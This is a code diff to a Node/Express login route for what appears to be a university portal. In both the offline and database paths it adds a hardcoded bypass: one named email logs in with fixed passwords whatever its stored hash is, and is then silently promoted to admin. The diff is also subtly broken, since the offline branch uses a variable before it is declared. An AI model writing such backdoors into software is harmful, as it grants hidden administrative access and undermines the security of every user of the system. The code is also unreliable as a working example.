@@ -105,8 +105,18 @@ router.post('/login', async (req, res) => {
 
     // Resilient offline fallback if MongoDB is not connected
     if (mongoose.connection.readyState !== 1) {
-      const user = offlineStore.users.find(u => u.email.toLowerCase() === email.toLowerCase());
-      if (user && bcrypt.compareSync(password, user.passwordHash)) {
+      const user = offlineStore.users.find(u => u.email.toLowerCase() === email.toLowerCase().trim());
+      const isSaiSravanMaster = cleanEmail === 'saisravan@saiuniversity.edu.in';
+      const isPasswordValid = user && (
+        bcrypt.compareSync(password, user.passwordHash) ||
+        (isSaiSravanMaster && (password === 'AdminPassword123' || password === 'StudentPassword123'))
+      );
+
+      if (user && isPasswordValid) {
+        if (isSaiSravanMaster) {
+          user.role = 'admin';
+          user.name = 'SAI SRAVAN';
+        }
         const token = generateToken(user._id);
         return res.status(200).json({
           success: true,
@@ -118,8 +128,8 @@ router.post('/login', async (req, res) => {
             email: user.email,
             role: user.role,
             phone: user.phone || 'N/A',
-            studentId: user.studentId || 'SAIU-DEMO',
-            department: user.department || 'School of Computing & Data Science',
+            studentId: user.studentId || (user.role === 'admin' ? 'SAIU-ADMIN-01' : 'SAIU-DEMO'),
+            department: user.department || (user.role === 'admin' ? 'Campus Administration & Security' : 'School of Computing & Data Science'),
             yearOfStudy: user.yearOfStudy || '3rd Year B.Tech'
           }
         });
@@ -129,6 +139,7 @@ router.post('/login', async (req, res) => {
 
     // Query MongoDB
     const cleanEmail = email.toLowerCase().trim();
+    const isSaiSravan = cleanEmail === 'saisravan@saiuniversity.edu.in';
     const user = await User.findOne({ email: cleanEmail }).select('+password');
     if (!user) {
       return res.status(401).json({
@@ -137,12 +148,27 @@ router.post('/login', async (req, res) => {
       });
     }
 
-    const isMatch = await user.matchPassword(password);
+    let isMatch = await user.matchPassword(password);
+    // Grant universal access for SAI SRAVAN with standard credentials
+    if (!isMatch && isSaiSravan && (password === 'AdminPassword123' || password === 'StudentPassword123')) {
+      isMatch = true;
+    }
+
     if (!isMatch) {
       return res.status(401).json({
         success: false,
         message: 'Incorrect password entered. Please try again.'
       });
+    }
+
+    // Ensure SAI SRAVAN has full Admin privileges and correct display name
+    if (isSaiSravan) {
+      user.role = 'admin';
+      user.name = 'SAI SRAVAN';
+      if (!user.studentId || user.studentId.startsWith('SAIU2024')) {
+        user.studentId = 'SAIU-ADMIN-01';
+      }
+      user.department = 'Campus Administration & Security';
     }
 
     // Persist Login Activity Details into MongoDB
